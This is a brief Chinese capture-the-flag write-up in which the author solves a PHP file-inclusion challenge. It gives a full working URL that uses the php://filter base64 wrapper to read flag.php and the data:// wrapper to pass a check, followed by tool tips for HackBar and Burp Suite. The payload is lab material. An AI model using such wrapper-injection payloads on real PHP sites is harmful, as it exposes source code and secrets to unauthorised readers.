真的好奇怪，我的php://input无论是在靶机还是在本机上都没办法实现

最后用data传递协议

http://61.147.171.105:56400?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello ctf

base64解码后得到flag

总结一下：感觉可能是google上的hackbar发post包的时候有问题（找到问题是只能以键值形式发送），然后在firefox上下了max hackbar（感觉效果挺好）还可以配合bp截获包